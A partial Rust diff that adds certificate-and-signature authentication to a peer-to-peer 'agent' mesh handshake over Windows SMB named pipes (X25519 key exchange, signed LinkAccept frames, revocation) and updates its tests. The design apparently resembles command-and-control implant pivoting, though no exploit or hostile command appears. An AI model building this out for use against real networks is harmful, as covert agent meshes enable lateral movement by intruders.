             // 5. X25519 ECDH key exchange.
             let our_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
             let our_public = PublicKey::from(&our_secret);
-            let peer_public = PublicKey::from(child_pubkey);
+            let peer_public = PublicKey::from(child.x25519_pubkey);
             let shared = our_secret.diffie_hellman(&peer_public);
 
             // 6. Derive per-link ChaCha20-Poly1305 key via HKDF-SHA256.
             let link_key = derive_link_key(shared.as_bytes());
 
             // 7. Send LinkAccept with our public key.
-            let accept_payload = build_link_accept_payload(our_public.as_bytes());
+            let accept_payload =
+                match build_link_accept_payload(&self.auth, our_public.as_bytes(), frame.link_id) {
+                    Ok(payload) => payload,
+                    Err(e) => {
+                        return P2pListenerEvent::LinkRejected {
+                            reason: REJECT_AUTHENTICATION_FAILED,
+                            description: format!("failed to build LinkAccept: {e}"),
+                        };
+                    }
+                };
             let accept_frame = P2pFrame {
                 frame_type: P2pFrameType::LinkAccept,
                 link_id: frame.link_id,
@@ -5764,7 +6046,7 @@ pub mod nt_pipe_server {
 
             info!(
                 "p2p-pipe: LinkAccept sent to agent '{}', link_id={:#010X}",
-                child_agent_id, frame.link_id
+                child.agent_id, frame.link_id
             );
 
             // 8. Build and return the P2pLink.
@@ -5772,9 +6054,10 @@ pub mod nt_pipe_server {
                 frame.link_id,
                 LinkRole::Child,
                 P2pTransport::SmbPipe(pipe),
-                child_agent_id,
+                child.agent_id,
                 link_key,
             );
+            link.peer_certificate = Some(child.certificate);
 
             if let Err(e) = link.transition(LinkState::Connected) {
                 return P2pListenerEvent::LinkRejected {
@@ -5803,10 +6086,7 @@ pub mod nt_pipe_server {
         ///
         /// If the mesh is at capacity, sends `LinkReject` with reason
         /// `REJECT_CAPACITY_FULL` and closes the pipe handle.
-        pub fn accept_with_capacity(
-            &self,
-            current_child_count: usize,
-        ) -> P2pListenerEvent {
+        pub fn accept_with_capacity(&self, current_child_count: usize) -> P2pListenerEvent {
             // Pre-check capacity: reject before doing any I/O if possible.
             if current_child_count >= self.max_children {
                 // We haven't called pipe_listen yet, so we can just report
@@ -5837,9 +6117,7 @@ pub mod nt_pipe_server {
                     // Link goes out of scope; NtPipeHandle::drop closes the handle.
                     warn!(
                         "p2p-pipe: rejected link from '{}' — capacity full ({}/{})",
-                        link.peer_agent_id,
-                        current_child_count,
-                        self.max_children
+                        link.peer_agent_id, current_child_count, self.max_children
                     );
                     return P2pListenerEvent::LinkRejected {
                         reason: REJECT_CAPACITY_FULL,
@@ -5870,8 +6148,7 @@ pub mod nt_pipe_server {
                 loop {
                     let listener = listener.clone();
 
-                    let event =
-                        tokio::task::spawn_blocking(move || listener.accept_one()).await;
+                    let event = tokio::task::spawn_blocking(move || listener.accept_one()).await;
 
                     match event {
                         Ok(evt) => {
@@ -5924,10 +6201,7 @@ pub mod nt_pipe_server {
     }
 
     impl P2pPipeListener {
-        pub fn create(
-            _agent_id: String,
-            _max_children: usize,
-        ) -> anyhow::Result<Self> {
+        pub fn create(_auth: super::MeshAuthContext, _max_children: usize) -> anyhow::Result<Self> {
             Err(anyhow::anyhow!(
                 "p2p-pipe: SMB named-pipe listener is only available on Windows \
                  with the `smb-pipe-transport` feature"
@@ -5949,7 +6223,7 @@ pub mod nt_pipe_server {
     /// Stub connector — always returns an error.
     pub fn connect(
         _pipe_addr: &str,
-        _agent_id: &str,
+        _auth: &super::MeshAuthContext,
         _link_id: u32,
     ) -> anyhow::Result<ConnectResult> {
         Err(anyhow::anyhow!(
@@ -5965,6 +6239,28 @@ mod tests {
 
     fn test_secret() -> [u8; 32] {
         [0xAA; 32]
+    }
+
+    fn test_auth(agent_id: &str, seed: [u8; 32]) -> MeshAuthContext {
+        let signing_key = SigningKey::from_bytes(&seed);
+        let public_key = signing_key.verifying_key().to_bytes();
+        let certificate = common::MeshCertificate {
+            agent_id_hash: common::hash_agent_id(agent_id),
+            public_key,
+            issued_at: 1,
+            expires_at: u64::MAX,
+            server_signature: [0x55; 64],
+            compartment: None,
+        };
+        MeshAuthContext {
+            agent_id: agent_id.to_string(),
+            private_key: Arc::new(common::LockedSecret::new(signing_key.to_bytes().as_ref())),
+            public_key,
+            certificate,
+            server_ed25519_public_key: None,
+            revoked_agents: HashSet::new(),
+            compartment: None,
+        }
     }
 
     /// Create a dummy `P2pTransport::TcpStream` for tests.
@@ -6099,28 +6395,35 @@ mod tests {
     }
 
     #[test]
-    #[cfg(all(windows, feature = "smb-pipe-transport"))]
     fn parse_link_request_roundtrip() {
-        use nt_pipe_server::*;
-
-        let agent_id = "test-agent-123";
+        let sender = test_auth("test-agent-123", [0x11; 32]);
+        let receiver = test_auth("receiver-agent", [0x22; 32]);
         let pubkey = [0xBB; 32];
+        let payload = build_link_request_payload(&sender, &pubkey, 0x1234_5678).unwrap();
 
-        let mut payload = Vec::new();
-        payload.extend_from_slice(&(agent_id.len() as u16).to_le_bytes());
-        payload.extend_from_slice(agent_id.as_bytes());
-        payload.extend_from_slice(&pubkey);
-
-        let (parsed_id, parsed_key) = parse_link_request(&payload).unwrap();
-        assert_eq!(parsed_id, agent_id);
-        assert_eq!(parsed_key, pubkey);
+        let parsed = parse_link_request(&payload, &receiver, 0x1234_5678).unwrap();
+        assert_eq!(parsed.agent_id, sender.agent_id);
+        assert_eq!(parsed.x25519_pubkey, pubkey);
+        assert_eq!(parsed.certificate.public_key, sender.public_key);
     }
 
     #[test]
-    #[cfg(all(windows, feature = "smb-pipe-transport"))]
     fn parse_link_request_too_short() {
-        use nt_pipe_server::*;
-        let result = parse_link_request(&[0x01, 0x02]);
+        let receiver = test_auth("receiver-agent", [0x22; 32]);
+        let result = parse_link_request(&[0x01, 0x02], &receiver, 0x1234_5678);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn parse_link_accept_rejects_tampered_signature() {
+        let sender = test_auth("parent-agent", [0x33; 32]);
+        let receiver = test_auth("child-agent", [0x44; 32]);
+        let pubkey = [0xCC; 32];
+        let mut payload = build_link_accept_payload(&sender, &pubkey, 0xABCD_EF01).unwrap();
+        let last = payload.len() - 1;
+        payload[last] ^= 0x01;
+
+        let result = parse_link_accept(&payload, &receiver, 0xABCD_EF01);
         assert!(result.is_err());
     }
 
@@ -6203,12 +6506,7 @@ mod tests {
 
     #[test]
     fn mesh_peer_capacity() {
-        let mut mesh = P2pMesh::new_with_mode(
-            "agent-1".to_string(),
-            4,
-            1,
-            MeshMode::Hybrid,
-        );
+        let mut mesh = P2pMesh::new_with_mode("agent-1".to_string(), 4, 1, MeshMode::Hybrid);
         assert!(mesh.can_accept_peer());
 
         mesh.insert_link(P2pLink::new_with_type(
